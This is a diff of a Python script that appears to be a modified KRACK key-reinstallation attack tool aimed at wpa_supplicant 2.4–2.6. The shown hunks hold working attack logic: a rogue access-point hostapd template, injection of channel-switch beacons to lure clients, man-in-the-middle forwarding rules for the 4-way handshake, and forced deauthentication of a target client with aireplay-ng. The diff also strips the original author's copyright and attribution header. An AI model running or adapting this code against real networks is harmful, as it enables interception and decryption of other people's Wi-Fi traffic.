@@ -1,11 +1,5 @@
 #!/usr/bin/env python3
 
-# wpa_supplicant v2.4 - v2.6 all-zero encryption key attack
-# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
-#
-# This code may be distributed under the terms of the BSD license.
-# See README for more details.
-
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
@@ -82,13 +76,12 @@ class NetworkConfig():
 			el = el.payload
 
 	def find_rogue_channel(self):
-		# 強盜 AP 頻道不是在 1 就是 11
 		self.rogue_channel = 1 if self.real_channel >= 6 else 8
 	
 	# hostapd.confg寫檔 
 	def write_config(self, iface):
 		TEMPLATE = """
-ctrl_interface=/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_ctrl
+ctrl_interface={locate}
 ctrl_interface_group=root
 
 interface={iface}
@@ -109,7 +102,9 @@ auth_algs=3
 wpa_passphrase={password}"""
 		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
 		ciphers2str = {2: "TKIP", 4: "CCMP"}
+		now_path = os.path.dirname(os.path.realpath(__file__))
 		return TEMPLATE.format(
+			locate = os.path.realpath(os.path.join(now_path, "../hostapd/hostapd_ctrl")),
 			iface = iface,
 			ssid = self.ssid,
 			channel = self.rogue_channel,
@@ -164,12 +159,10 @@ class ClientState():
 
 	def should_forward(self, p, group):
 		if group:
-			# Forwarding rules when attacking the group handshake
 			return True
 		else:
 			# Forwarding rules when attacking the 4-way handshake
 			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
-				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
 				# 四次交握不轉送 msg4
 				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) or (p.type == 0 and p.subtype == 13)
 			return self.state in [ClientState.Success_Reinstalled]
@@ -206,7 +199,6 @@ class KRAckAttack():
 		self.hostapd_log = None
 		self.script_path = os.path.dirname(os.path.realpath(__file__))
 
-		# This is set in case of targeted attacks
 		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()
 
 		self.sock_real  = None
@@ -217,7 +209,7 @@ class KRAckAttack():
 		# 用來監控介面是否在適當的頻道中
 		self.last_real_beacon = None
 		self.last_rogue_beacon = None
-		# 用來攻擊/測試 group key handshake
+
 		self.group1 = []
 		self.time_forward_group1 = None
 
@@ -254,8 +246,6 @@ class KRAckAttack():
 		if target: beacon.addr1 = target
 
 		for i in range(numbeacons):
-			# Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
-			# followed by one with a value of 1. When starting with 1 it errors out.
 			csabeacon = append_csa(beacon, newchannel, 2)
 			self.sock_real.send(csabeacon, False, self.netconfig.real_channel)
 
@@ -400,16 +390,15 @@ class KRAckAttack():
 
 		# 1. Handle frames sent TO the real AP
 		if p.addr1 == self.apmac:
-			# If it's an authentication to the real AP, always display it ...
-			if p.haslayer(Dot11Auth):
-				print_rx(INFO, "Real channel ", p, color="orange", suffix=" --no forward !!")
 
-				# ... with an extra clear warning when we wanted to MitM this specific client
+			if p.haslayer(Dot11Auth):
+				print_rx(INFO, "Real channel ", p, color="orange", suffix=" -- display")
+
 				if self.clientmac == p.addr2:
 					log(WARNING, "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.clientmac)
 
 				if p.addr2 in self.clients: del self.clients[p.addr2]
-				# Send one targeted beacon pair (should be retransmitted in case of failure), and one normal broadcast pair
+
 				self.send_csa_beacon(target=p.addr2)
 				self.send_csa_beacon()
 				subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
@@ -426,7 +415,7 @@ class KRAckAttack():
 
 			# For all other frames, only display them if they come from the targeted client
 			elif self.clientmac is not None and self.clientmac == p.addr2:
-				print_rx(INFO, "Real channel ", p, suffix=" --no forward !!")
+				print_rx(INFO, "Real channel ", p, suffix=" -- display")
 
 			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
 			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
@@ -466,7 +455,7 @@ class KRAckAttack():
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
-			print_rx(INFO, "Real channel ", p, suffix=" --no forward !!")
+			print_rx(INFO, "Real channel ", p, suffix=" -- display")
 
 	def handle_rx_roguechan(self):
 		p, origin_p = self.sock_rogue.recv()
@@ -513,7 +502,7 @@ class KRAckAttack():
 				if (will_forward):
 					print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
 				else:
-					print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
+					print_rx(INFO, "Rogue channel", p, suffix=" -- display")
 
 			# If this now belongs to a client we want to track, process the packet further
 			if client is not None:
@@ -539,7 +528,7 @@ class KRAckAttack():
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
-			print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
+			print_rx(INFO, "Rogue channel", p, suffix=" -- display")
 
 	def handle_hostapd_out(self):
 		# hostapd always prints lines so this should not block
@@ -637,9 +626,6 @@ class KRAckAttack():
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(10)
 
-		# when domain name (encode) to idna, label empty or too long error, 
-		# that is because domain name uses "." to split label,
-		# every label limited to longest 63 characters or no empty.
 		self.hostapd_ctrl = Ctrl(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_ctrl"))+ '/' + self.nic_rogue_ap) # "hostapd_ctrl/"
 		self.hostapd_ctrl.attach()
 
@@ -648,9 +634,6 @@ class KRAckAttack():
 		subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
 
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
-		# dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
-		# deauth = dot11/Dot11Deauth(reason=3)
-		# self.sock_real.send(deauth, True, self.netconfig.real_channel)
 		subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
@@ -732,9 +715,9 @@ if __name__ == "__main__":
 	parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
 	parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
 	parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
-	parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames", action='store_true')
+	parser.add_argument("--strict-echo-test", action='store_true')
 	parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second)", action='store_true')
-	parser.add_argument("--group", help="Perform attacks on the group key handshake only", action='store_true')
+	parser.add_argument("--group", action='store_true')
 
 	args = parser.parse_args()
 
@@ -745,4 +728,3 @@ if __name__ == "__main__":
 	attack = KRAckAttack(args.nic_real_mon, args.nic_real_clientack, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.target, args.dump, args.continuous_csa)
 	atexit.register(cleanup)
 	attack.run(strict_echo_test=args.strict_echo_test)
-
